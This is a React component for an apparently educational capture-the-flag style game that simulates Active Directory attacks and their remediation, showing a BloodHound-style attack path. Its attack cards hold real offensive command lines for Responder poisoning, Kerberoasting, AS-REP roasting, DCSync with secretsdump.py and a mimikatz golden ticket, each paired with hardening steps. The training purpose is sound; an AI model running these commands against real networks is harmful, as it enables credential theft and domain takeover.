import { useState, useCallback } from 'react';
import { Shield, Lock, Key, Server, Bug, AlertTriangle, CheckCircle2, Network, Eye } from 'lucide-react';
import {
  ReactFlow, Background, Controls, BackgroundVariant, Position,
  type Node, type Edge,
} from '@xyflow/react';
import { motion, AnimatePresence } from 'framer-motion';
import { sfx } from '@/utils/soundEngine';

interface ADAttack {
  id: string;
  name: string;
  icon: typeof Shield;
  command: string;
  output: string;
  fix: string;
  fixCommand: string;
  risk: string;
}

const AD_ATTACKS: ADAttack[] = [
  {
    id: 'llmnr',
    name: 'LLMNR/NBT-NS Poisoning (Responder)',
    icon: Network,
    command: 'responder -I eth0 -rdwv\n# [SMB] NTLMv2-SSP Hash:',
    output: 'admin::CORP:1122334455667788:A1B2C3D4E5F6G7H8:0101000000000000...\n# john --format=netntlmv2 hashes.txt → "Summer2023!"',
    fix: 'Enforce SMB Signing (Required). Disable LLMNR/NBT-NS via GPO.',
    fixCommand: 'Set-SmbServerConfiguration -RequireSecuritySignature $true\n# GPO: Computer Config > Admin Templates > Network > DNS Client\n# Turn off multicast name resolution = Enabled',
    risk: 'critical',
  },
  {
    id: 'kerberoast',
    name: 'Kerberoasting (GetUserSPNs.py)',
    icon: Key,
    command: 'GetUserSPNs.py corp.local/svc_sql:Pass123 -request\n# ServicePrincipalName: MSSQLSvc/DC01.corp.local:1433',
    output: '$krb5tgs$23$*svc_sql$CORP.LOCAL*MSSQLSvc/DC01*\n# hashcat -m 13100 tgs.txt wordlist.txt\n# → recovered: "SQLsvcP@ss2024!" (RC4-HMAC, crackable)',
    fix: 'Use AES-256 Kerberos encryption. Deploy gMSA with 25+ char passwords.',
    fixCommand: '# Set-SpnServiceAccount -UseAes256 $true\n# New-ADServiceAccount -Name svc_sql -KerberosEncryptionType AES256\n# Minimum password length: 25 chars (gMSA auto-rotate)',
    risk: 'critical',
  },
  {
    id: 'asrep',
    name: 'AS-REP Roasting',
    icon: Lock,
    command: 'GetNPUsers.py corp.local/ -no-pass -usersfile users.txt\n# User: jdoe has "Do not require Kerberos preauthentication"',
    output: '$krb5asrep$23$jdoe@CORP.LOCAL:88a1b2c3...\n# hashcat -m 18200 asrep.txt wordlist.txt\n# → recovered: "Welcome1!"',
    fix: 'Disable "Do not require Kerberos preauthentication" for all accounts.',
    fixCommand: '# For each user:\n# Set-ADUser -Identity jdoe -DoesNotRequirePreAuth $false\n# Audit: Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}',
    risk: 'high',
  },
  {
    id: 'dcsync',
    name: 'DCSync (secretsdump.py)',
    icon: Server,
    command: 'secretsdump.py -just-dc-ntlm corp.local/svc_sql:Pass123@DC01.corp.local\n# Requires DS-Replication-Get-Changes privilege',
    output: 'krbtgt: aad3b435b51404eeaad3b435b51404ee:0c2e7e9a...\nAdministrator: aad3b435b51404eeaad3b435b51404ee:2b876...\n# Full NTDS.dit hash dump — domain compromise',
    fix: 'Restrict DS-Replication-Get-Changes to Domain Controllers only. Monitor for replication requests from non-DC hosts.',
    fixCommand: '# Remove replication privileges from service accounts:\n# Remove-ADPermission -Identity "DC=corp,DC=local" \\\n#   -User svc_sql -ExtendedRights DS-Replication-Get-Changes\n# Audit replication events: Event ID 4662',
    risk: 'critical',
  },
  {
    id: 'golden',
    name: 'Golden Ticket (mimikatz)',
    icon: AlertTriangle,
    command: 'mimikatz # kerberos::golden /user:Administrator /domain:corp.local\n  /sid:S-1-5-21-... /krbtgt:0c2e7e9a... /ptt',
    output: '# TGT forged with stolen krbtgt hash\n# Access ANY service in the domain — even after password reset\n# Persistence: ticket valid for 10 years by default',
    fix: 'Double krbtgt password reset (reset twice, wait 12h between). Force re-authentication.',
    fixCommand: '# Reset krbtgt password TWICE (breaks all existing TGTs):\n# Set-ADAccountPassword krbtgt -NewPassword (ConvertTo-SecureString...)\n# Wait 12+ hours (> max ticket lifetime)\n# Reset krbtgt again\n# Verify: klist, event logs for forged ticket usage',
    risk: 'critical',
  },
];

function createBloodhoundNodes(pathComplete: boolean, fullyCompromised: boolean): Node[] {
  const defended = pathComplete && !fullyCompromised;
  return [
    {
      id: 'workstation',
      position: { x: 0, y: 200 },
      data: { label: 'WS-01\nsvc_sql@corp.local' },
      type: 'default',
      style: {
        background: '#0D1220', border: `1.5px solid ${defended ? '#10B981' : '#EF4444'}`, borderRadius: '8px',
        color: defended ? '#34D399' : '#F87171', fontSize: '10px', fontWeight: 600, width: '130px', textAlign: 'center',
      },
      sourcePosition: Position.Right, targetPosition: Position.Left,
    },
    {
      id: 'helpdesk',
      position: { x: 220, y: 100 },
      data: { label: 'IT_Helpdesk\nGroup' },
      type: 'default',
      style: {
        background: '#0D1220', border: `1.5px solid ${defended ? '#10B981' : pathComplete ? '#EF4444' : '#EF4444'}`, borderRadius: '8px',
        color: `${defended ? '#34D399' : '#F87171'}`, fontSize: '10px', fontWeight: 600, width: '120px', textAlign: 'center',
      },
      sourcePosition: Position.Right, targetPosition: Position.Left,
    },
    {
      id: 'dc01',
      position: { x: 440, y: 200 },
      data: { label: 'DC01.corp.local\nDomain Controller' },
      type: 'default',
      style: {
        background: '#0D1220', border: `1.5px solid ${defended ? '#10B981' : '#EF4444'}`, borderRadius: '8px',
        color: `${defended ? '#34D399' : '#F87171'}`, fontSize: '10px', fontWeight: 600, width: '130px', textAlign: 'center',
      },
      sourcePosition: Position.Right, targetPosition: Position.Left,
    },
    {
      id: 'domainadmin',
      position: { x: 660, y: 200 },
      data: { label: fullyCompromised ? 'DOMAIN ADMIN\nCAPTURED' : defended ? 'DOMAIN ADMIN\nDEFENDED' : 'DOMAIN ADMIN\n(Locked)' },
      type: 'default',
      style: {
        background: fullyCompromised ? '#2A0A0A' : defended ? '#062018' : '#0D1220',
        border: `2px solid ${fullyCompromised ? '#EF4444' : defended ? '#10B981' : '#243049'}`,
        borderRadius: '8px',
        color: fullyCompromised ? '#F87171' : defended ? '#34D399' : '#475569',
        fontSize: '11px', fontWeight: 700, width: '130px', textAlign: 'center',
        boxShadow: fullyCompromised ? '0 0 20px rgba(239,68,68,0.4)' : defended ? '0 0 20px rgba(16,185,129,0.4)' : 'none',
      },
      sourcePosition: Position.Right, targetPosition: Position.Left,
    },
  ];
}

function createBloodhoundEdges(pathComplete: boolean, fullyCompromised: boolean, selectedEdge: string | null): Edge[] {
  const defended = pathComplete && !fullyCompromised;
  const baseStyle = { strokeWidth: 1.5, animated: !defended && !fullyCompromised };
  return [
    {
      id: 'e-ws-helpdesk',
      source: 'workstation', target: 'helpdesk',
      label: 'GenericAll',
      style: { stroke: selectedEdge === 'e-ws-helpdesk' ? '#06B6D4' : (defended ? '#10B981' : '#EF4444'), ...baseStyle },
      animated: !defended && !fullyCompromised,
    },
    {
      id: 'e-helpdesk-dc',
      source: 'helpdesk', target: 'dc01',
      label: 'AdminTo',
      style: { stroke: selectedEdge === 'e-helpdesk-dc' ? '#06B6D4' : (defended ? '#10B981' : '#EF4444'), ...baseStyle },
      animated: !defended && !fullyCompromised,
    },
    {
      id: 'e-dc-da',
      source: 'dc01', target: 'domainadmin',
      label: 'DCSync',
      style: { stroke: selectedEdge === 'e-dc-da' ? '#06B6D4' : (defended ? '#10B981' : '#EF4444'), ...baseStyle },
      animated: !defended && !fullyCompromised,
    },
  ];
}

const EDGE_DETAILS: Record<string, { acl: string; desc: string; abuse: string }> = {
  'e-ws-helpdesk': { acl: 'GenericAll', desc: 'Full control over the IT_Helpdesk group object', abuse: 'Add svc_sql to IT_Helpdesk group, or force change password of any helpdesk member' },
  'e-helpdesk-dc': { acl: 'AdminTo', desc: 'IT_Helpdesk has local admin on DC01', abuse: 'PsExec / WMI / WinRM to DC01 → full control of Domain Controller' },
  'e-dc-da': { acl: 'DCSync', desc: 'Replication privileges on the domain', abuse: 'secretsdump.py to extract krbtgt hash → forge Golden Ticket' },
};

interface Workspace7Props {
  onCaptureFlag?: (flagId: string) => void;
}

export function Workspace7({ onCaptureFlag }: Workspace7Props) {
  const [pathComplete, setPathComplete] = useState(false);
  const [fullyCompromised, setFullyCompromised] = useState(false);
  const [selectedEdge, setSelectedEdge] = useState<string | null>(null);
  const [exploited, setExploited] = useState<Set<string>>(new Set());
  const [hardened, setHardened] = useState<Set<string>>(new Set());
  const [flagCaptured, setFlagCaptured] = useState(false);

  const handleExploit = (id: string) => {
    setExploited((prev) => new Set([...prev, id]));
    sfx.breach();
  };

  const handleHarden = (id: string) => {
    setHardened((prev) => new Set([...prev, id]));
    sfx.shield();
    // Check if all 5 are hardened → path is defended (not compromised)
    if (hardened.size + 1 >= AD_ATTACKS.length) {
      setPathComplete(true);
      setFullyCompromised(false);
    }
  };

  const handleCompletePath = useCallback(() => {
    setPathComplete(true);
    setFullyCompromised(true);
    sfx.breach();
    if (onCaptureFlag && !flagCaptured) {
      onCaptureFlag('flag-dcadmin');
      setFlagCaptured(true);
    }
  }, [onCaptureFlag, flagCaptured]);

  const nodes = createBloodhoundNodes(pathComplete, fullyCompromised);
  const edges = createBloodhoundEdges(pathComplete, fullyCompromised, selectedEdge);
  const edgeDetail = selectedEdge ? EDGE_DETAILS[selectedEdge] : null;

  const riskBadge = (risk: string) => risk === 'critical' ? 'badge-crimson' : 'badge-amber';

  return (
    <div className="flex h-full overflow-auto p-2 gap-2">
      {/* Left: BloodHound Attack Path */}
      <div className="flex-1 panel flex flex-col overflow-hidden min-w-0">
        <div className="panel-header">
          <Network size={12} className="text-cyan-400" />
          BloodHound Attack Path Canvas
        </div>
        <div className="flex-1 relative bg-obsidian-950/50 grid-bg min-h-[300px]">
          <ReactFlow
            nodes={nodes}
            edges={edges}
            fitView
            fitViewOptions={{ padding: 0.15 }}
            panOnDrag
            zoomOnScroll
            nodesDraggable
            onEdgeClick={(_, edge) => { setSelectedEdge(edge.id); sfx.click(); }}
            proOptions={{ hideAttribution: true }}
          >
            <Background variant={BackgroundVariant.Dots} gap={16} size={1} color="#1A2236" />
            <Controls showInteractive={false} />
          </ReactFlow>
          {/* Edge detail popup */}
          <AnimatePresence>
            {edgeDetail && (
              <motion.div
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: 10 }}
                className="absolute bottom-3 left-3 panel p-3 max-w-xs z-10"
              >
                <div className="flex items-center gap-2 mb-1">
                  <span className="badge-cyan">{edgeDetail.acl}</span>
                  <span className="text-[10px] text-slate-500">ACL Abuse</span>
                </div>
                <div className="text-[10px] text-slate-400">{edgeDetail.desc}</div>
                <div className="text-[10px] text-crimson-400 mt-1 font-mono">→ {edgeDetail.abuse}</div>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
        <div className="border-t border-obsidian-700 p-2 flex items-center gap-2 shrink-0">
          <span className="text-[10px] text-slate-500">
            Shortest path: svc_sql → IT_Helpdesk (GenericAll) → DC01 (AdminTo) → Domain Admin (DCSync)
          </span>
          {!pathComplete ? (
            <button className="btn-crimson ml-auto flex items-center gap-1" onClick={handleCompletePath}>
              <Eye size={11} /> Simulate Full Compromise
            </button>
          ) : fullyCompromised ? (
            <span className="badge-crimson ml-auto">PATH COMPROMISED — DOMAIN ADMIN CAPTURED</span>
          ) : (
            <span className="badge-emerald ml-auto">PATH DEFENDED — DOMAIN ADMIN SECURED</span>
          )}
        </div>
      </div>

      {/* Right: Kerberos Attack Cards */}
      <div className="w-[460px] shrink-0 panel flex flex-col overflow-hidden">
        <div className="panel-header">
          <Key size={12} className="text-cyan-400" />
          Kerberos & Domain Exploitation Simulator
        </div>
        <div className="flex-1 overflow-auto p-3 space-y-2">
          {AD_ATTACKS.map((attack) => {
            const Icon = attack.icon;
            const isExploited = exploited.has(attack.id);
            const isHardened = hardened.has(attack.id);
            return (
              <div key={attack.id} className={`panel overflow-hidden border ${isHardened ? 'border-emerald-600/30' : isExploited ? 'border-crimson-600/30' : 'border-obsidian-700'}`}>
                <div className="flex items-center gap-3 p-2.5">
                  <div className={`p-1.5 rounded-md ${isHardened ? 'bg-emerald-600/10' : isExploited ? 'bg-crimson-600/10' : 'bg-obsidian-800'}`}>
                    <Icon size={14} className={isHardened ? 'text-emerald-400' : isExploited ? 'text-crimson-400' : 'text-slate-500'} />
                  </div>
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center gap-2">
                      <span className="text-xs font-semibold text-slate-300">{attack.name}</span>
                      <span className={riskBadge(attack.risk)}>{attack.risk}</span>
                    </div>
                  </div>
                  <div className="flex items-center gap-1 shrink-0">
                    {!isExploited && !isHardened && (
                      <button className="btn-crimson flex items-center gap-1" onClick={() => handleExploit(attack.id)}>
                        <Bug size={10} /> Exploit
                      </button>
                    )}
                    {isExploited && !isHardened && (
                      <button className="btn-emerald flex items-center gap-1" onClick={() => handleHarden(attack.id)}>
                        <Shield size={10} /> Harden
                      </button>
                    )}
                  </div>
                </div>
                <AnimatePresence>
                  {isExploited && (
                    <motion.div initial={{ opacity: 0, height: 0 }} animate={{ opacity: 1, height: 'auto' }} exit={{ opacity: 0, height: 0 }} className="px-2.5 pb-2.5 space-y-1.5">
                      <div className="terminal p-2">
                        <div className="text-[9px] text-slate-600 uppercase mb-0.5">Command</div>
                        <pre className="text-[9px] font-mono text-cyan-400 whitespace-pre-wrap">{attack.command}</pre>
                      </div>
                      <div className="terminal p-2 border-crimson-600/20">
                        <div className="text-[9px] text-crimson-400 uppercase mb-0.5 flex items-center gap-1"><AlertTriangle size={9} /> Output</div>
                        <pre className="text-[9px] font-mono text-crimson-400 whitespace-pre-wrap">{attack.output}</pre>
                      </div>
                    </motion.div>
                  )}
                </AnimatePresence>
                {isHardened && (
                  <motion.div initial={{ opacity: 0, height: 0 }} animate={{ opacity: 1, height: 'auto' }} className="px-2.5 pb-2.5 space-y-1.5">
                    <div className="panel p-2 text-[10px] text-slate-400 border-emerald-600/20">{attack.fix}</div>
                    <div className="terminal p-2 border-emerald-600/20">
                      <div className="text-[9px] text-emerald-400 uppercase mb-0.5 flex items-center gap-1"><CheckCircle2 size={9} /> Remediation</div>
                      <pre className="text-[9px] font-mono text-emerald-400 whitespace-pre-wrap">{attack.fixCommand}</pre>
                    </div>
                  </motion.div>
                )}
              </div>
            );
          })}

          {/* Summary */}
          <div className="panel p-3">
            <div className="text-[10px] text-slate-500 uppercase mb-2">AD Hardening Summary</div>
            <div className="grid grid-cols-3 gap-2">
              <div className="text-center p-2 rounded bg-obsidian-800">
                <div className="text-lg font-bold text-crimson-400">{Math.max(0, exploited.size - hardened.size)}</div>
                <div className="text-[8px] text-slate-600">Exploited</div>
              </div>
              <div className="text-center p-2 rounded bg-obsidian-800">
                <div className="text-lg font-bold text-emerald-400">{hardened.size}</div>
                <div className="text-[8px] text-slate-600">Hardened</div>
              </div>
              <div className="text-center p-2 rounded bg-obsidian-800">
                <div className="text-lg font-bold text-cyan-400">{AD_ATTACKS.length}</div>
                <div className="text-[8px] text-slate-600">Total</div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
